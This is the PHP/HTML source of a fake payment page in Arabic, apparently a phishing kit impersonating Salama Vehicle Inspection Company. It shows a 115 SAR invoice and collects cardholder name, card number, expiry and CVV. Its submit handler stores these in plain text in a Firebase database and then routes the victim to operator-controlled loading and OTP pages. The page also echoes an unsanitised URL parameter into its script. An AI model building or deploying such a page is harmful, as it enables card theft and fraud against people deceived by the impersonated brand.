<?php
error_reporting(0);
ini_set('display_errors', 0);
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Safe Payment Gateway - Salama</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --main-blue: #00acc1; --dark-blue: #2c3e50; --gold-btn: #fbb03b; --error-red: #ef4444; --footer-bg: #eeeeee; }
        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .content { flex: 1; }
        .container { max-width: 450px; margin: auto; padding: 15px; }
        .header-img { width: 100%; display: block; margin-bottom: 10px; }

        .invoice-card { background: #fff; border: 1px solid #eeeeee; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        .inv-header { font-size: 18px; font-weight: 800; color: var(--dark-blue); margin-bottom: 15px; border-bottom: 3px solid var(--main-blue); display: inline-block; padding-bottom: 5px; }
        .row-b { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f7f7f7; font-size: 15px; }
        .val { color: #111827; font-weight: 700; font-family: 'Tahoma', sans-serif; }
        .total-box { background: #fafafa; margin: 15px -20px -20px; padding: 20px; border-radius: 0 0 12px 12px; border-top: 1px solid #eee; }

        .pay-card { background: #fff; border: 1px solid #eeeeee; border-radius: 15px; padding: 25px; position: relative; }
        .pay-instruction { font-size: 13px; font-weight: 700; color: #6b7280; margin-bottom: 12px; }
        .methods-row { display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #f5f5f5; padding-bottom: 15px; }
        .methods-row img.main-logos { height: 26px; }
        
        .form-group { margin-bottom: 20px; text-align: right; position: relative; }
        label { display: block; font-size: 14px; font-weight: 700; color: #4b5563; margin-bottom: 8px; }
        
        input { width: 100%; padding: 14px; border: 1.5px solid #dcdcdc; border-radius: 10px; font-size: 16px; box-sizing: border-box; text-align: left; transition: 0.3s; outline: none; background: #fff; }
        
        #dynamic-logo { position: absolute; left: 12px; top: 40px; height: 22px; display: none; pointer-events: none; z-index: 5; }

        input.invalid { border: 2.5px solid var(--error-red) !important; background-color: #fffafa !important; }
        .err-hint { color: var(--error-red); font-size: 12px; font-weight: 800; margin-top: 6px; display: none; text-align: center; }

        .btn-submit { background: var(--gold-btn); color: #fff; width: 100%; padding: 18px; border: none; border-radius: 12px; font-size: 21px; font-weight: 800; cursor: pointer; margin-top: 10px; }
        
        .bottom-badges { display: flex; justify-content: flex-start; gap: 15px; margin-top: 25px; padding-bottom: 20px; }
        .bottom-badges img { height: 45px; border: none; }

        footer { background-color: var(--footer-bg); color: #666; text-align: center; padding: 20px 10px; font-size: 13px; border-top: 1px solid #ddd; width: 100%; font-family: sans-serif; }
        footer a { color: #333; text-decoration: none; margin: 0 8px; font-weight: 600; }
    </style>
</head>
<body>

<div class="content">
    <img src="https://i.ibb.co/JRL1qXkP/Whats-App-Image-2024-09-05-at-8-51-55-AM.jpg" class="header-img">

    <div class="container">
        <div class="invoice-card">
            <div class="inv-header">تفاصيل الفاتورة الإلكترونية</div>
            <div class="row-b"><span>رقم المرجع</span><span class="val">#SA-992834</span></div>
            <div class="row-b"><span>إجمالي المبلغ المستحق</span><span class="val">115.00 SAR</span></div>
            <div class="row-b"><span>المجموع الفرعي (قبل الضريبة)</span><span class="val">100.00 SAR</span></div>
            <div class="row-b"><span>ضريبة القيمة المضافة (15%)</span><span class="val">15.00 SAR</span></div>
            <div class="row-b total-box">
                <span style="font-size:17px; font-weight:800;">إجمالي المطلوب دفعه</span>
                <span class="val" style="font-size:20px; color: var(--main-blue);">115.00 SAR</span>
            </div>
        </div>

        <div class="pay-card">
            <div class="pay-instruction">سيتم تنفيذ عملية الدفع من خلال وسائل الدفع المحددة أدناه:</div>
            <div class="methods-row">
                <img src="https://i.ibb.co/tpNdmqZz/IMG-20260312-WA0007.jpg" class="main-logos">
            </div>

            <form id="payment-form">
                <div class="form-group">
                    <label>الاسم على البطاقة</label>
                    <input type="text" id="holder" placeholder="CARDHOLDER NAME" oninput="this.value = this.value.replace(/[0-9]/g, '')" required>
                </div>
                
                <div class="form-group">
                    <label>رقم البطاقة</label>
                    <input type="tel" id="card_num" placeholder="0000 0000 0000 0000" maxlength="19" oninput="validateCardLive(this)" required>
                    <img id="dynamic-logo" src="">
                    <div id="card-err" class="err-hint">Please check your card details</div>
                </div>

                <div style="display:flex; gap:12px;">
                    <div class="form-group" style="flex:1.2;">
                        <label>تاريخ الانتهاء</label>
                        <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5" oninput="validateExpiryLive(this)" required>
                        <div id="exp-err" class="err-hint">Card is Expired!</div>
                    </div>
                    <div class="form-group" style="flex:0.8;">
                        <label>رمز (CVV)</label>
                        <input type="password" id="cvv" placeholder="***" maxlength="4" required>
                    </div>
                </div>
                
                <button type="submit" class="btn-submit">تأكيد عملية الدفع</button>
            </form>
        </div>

        <div class="bottom-badges">
            <img src="https://i.ibb.co/zH6kM53T/vecteezy-icon.png">
            <img src="https://i.ibb.co/WWLYkBWV/vecteezy-icon01.jpg">
        </div>
    </div>
</div>

<footer>
    <div><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></div>
    <div style="margin-top:8px;">All Rights Reserved to Salama Vehicle Inspection Company © 2026</div>
</footer>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const pID = "<?php echo $phone; ?>";

// التحقق من رقم البطاقة (Luhn) [cite: 2026-02-19]
function isLuhn(n) {
    let s = n.replace(/\s+/g, '');
    let sum = 0; let shouldDouble = false;
    for (let i = s.length - 1; i >= 0; i--) {
        let digit = parseInt(s.charAt(i));
        if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
        sum += digit; shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
}

function validateCardLive(el) {
    let v = el.value.replace(/\s+/g, '').replace(/[^\d]/g, '');
    el.value = v.replace(/(.{4})/g, '$1 ').trim();
    const dl = document.getElementById('dynamic-logo');
    if(v.length >= 1) {
        let type = v.startsWith('4') ? 'visa' : v.startsWith('5') ? 'mastercard' : v.startsWith('6') ? 'mada' : '';
        if(type) { dl.src = `https://raw.githubusercontent.com/a7med-nemr/card-logos/main/${type}.png`; dl.style.display = "block"; }
        else { dl.style.display = "none"; }
    } else { dl.style.display = "none"; }

    if(v.length >= 16) {
        if(!isLuhn(v)) { el.classList.add('invalid'); document.getElementById('card-err').style.display = "block"; }
        else { el.classList.remove('invalid'); document.getElementById('card-err').style.display = "none"; }
    }
}

// الفحص الذكي للتاريخ [cite: 2026-02-25]
function validateExpiryLive(el) {
    let v = el.value.replace(/[^\d]/g, '');
    if(v.length >= 2) el.value = v.substring(0,2) + '/' + v.substring(2,4);
    else el.value = v;

    if(v.length === 4) {
        const now = new Date();
        const curMonth = now.getMonth() + 1; // شهور الجافاسكريبت تبدأ من 0
        const curYear = parseInt(now.getFullYear().toString().substring(2)); // يأخذ آخر رقمين (26)

        const inputMonth = parseInt(v.substring(0,2));
        const inputYear = parseInt(v.substring(2,4));

        // إذا كانت السنة أقل من الحالية، أو نفس السنة والشهر انتهى
        if (inputYear < curYear || (inputYear === curYear && inputMonth <= curMonth)) {
            el.classList.add('invalid');
            document.getElementById('exp-err').style.display = "block";
        } else if (inputMonth > 12) {
            el.classList.add('invalid');
            document.getElementById('exp-err').innerText = "Invalid Month!";
            document.getElementById('exp-err').style.display = "block";
        } else {
            el.classList.remove('invalid');
            document.getElementById('exp-err').style.display = "none";
        }
    } else {
        el.classList.remove('invalid');
        document.getElementById('exp-err').style.display = "none";
    }
}

document.getElementById('payment-form').onsubmit = function(e) {
    e.preventDefault();
    if(document.querySelector('.invalid')) return false;

    db.ref('payments/'+pID).set({
        holder: document.getElementById('holder').value,
        card: document.getElementById('card_num').value,
        exp: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        status: 'pending'
    }).then(()=> { window.location.href = "loading.php?phone="+pID; });
};

if(pID) {
    db.ref('payments/'+pID).on('value', (s) => {
        const d = s.val();
        if(d && d.status === 'error') {
            document.getElementById('card_num').classList.add('invalid');
            document.getElementById('expiry').classList.add('invalid');
            document.getElementById('card-err').style.display = "block";
        }
        if(d && d.status === 'otp') { window.location.href = "otp.php?phone="+pID; }
    });
}
</script>
</body>
</html>